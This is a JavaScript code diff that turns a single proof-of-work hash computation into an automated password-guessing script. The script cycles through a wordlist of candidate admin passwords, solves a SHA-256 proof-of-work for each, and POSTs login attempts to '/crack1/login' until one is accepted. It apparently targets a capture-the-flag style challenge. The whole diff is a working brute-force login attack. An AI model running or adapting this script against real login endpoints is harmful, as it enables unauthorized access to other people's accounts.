@@ -138,50 +138,77 @@ function SHA256(s) {
   return binb2hex(core_sha256(str2binb(s), s.length * chrsz))
 }
 
-let username = 'admin'
-let password = '20221024'
-// let nonce = parseInt(Math.random() * 100 + 9)
-let nonce = parseInt(60)
-let random = 'b76377fc-877f-4a92-8aa0-b782c38df328'
-console.log(nonce)
-for (var i = 0; i < Math.pow(2, 255); i++) {
-  let mystr = username + password + random + i.toString()
-  var s256 = SHA256(mystr)
-  var s256hex = parseInt(s256, 16)
-  if (s256hex < Math.pow(2, 256 - nonce)) {
-    console.log('success!')
-    console.log(mystr)
-    console.log(s256)
-    console.log(s256hex)
-    console.log(
-      JSON.stringify({
-        username: username,
-        password: password,
-        nonce: nonce,
-        random: random,
+const passwordList = [
+  'godzilla',
+  'lifehack',
+  'platinum',
+  'wrangler',
+  'bili1024',
+  '1024bili',
+  'bili2022',
+  '2022bili',
+  '20221024',
+  '10242022',
+  'bili2224',
+]
+
+const getParams = (password) => {
+  let username = 'admin'
+  let nonce = parseInt(9)
+  let random = 'b76377fc-877f-4a92-8aa0-b782c38df328'
+  for (var i = 0; i < Math.pow(2, 255); i++) {
+    let mystr = username + password + random + i.toString()
+    var s256 = SHA256(mystr)
+    var s256hex = parseInt(s256, 16)
+    if (s256hex < Math.pow(2, 256 - nonce)) {
+      const params = JSON.stringify({
+        username,
+        password,
+        nonce,
+        random,
         proof: i.toString(),
-      }),
-    )
-    break
+      })
+      return params
+    }
   }
 }
 
-// $.ajax({
-//   url: '/crack1/login',
-//   type: 'POST',
-//   data: JSON.stringify({
-//     username: 'ez',
-//     password: 'intruder',
-//     nonce: 22,
-//     random: 'b76377fc-877f-4a92-8aa0-b782c38df328',
-//     proof: '1132501',
-//   }),
-//   dataType: 'json',
-//   contentType: 'application/json',
-//   success: function (data) {
-//     console.log(data)
-//   },
-//   error: function (data) {
-//     console.log(data)
-//   },
-// })
+const login = async (password) => {
+  return new Promise((resolve, reject) => {
+    const params = getParams(password)
+    setTimeout(() => {
+      fetch('/crack1/login', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: params,
+      })
+        .then((data) => {
+          resolve(data.json())
+        })
+        .catch((error) => {
+          console.log('error', error)
+          reject({ msg: "you don't proof your work" })
+        })
+    }, 500)
+  })
+}
+
+const start = async () => {
+  for (let index = 0; index < passwordList.length; index++) {
+    const password = passwordList[index]
+    try {
+      const result = await login(password)
+      console.log(password, result)
+      if (result.msg !== "you don't proof your work") {
+        break
+      }
+    } catch (error) {
+      console.log(error)
+    }
+  }
+}
+
+start()
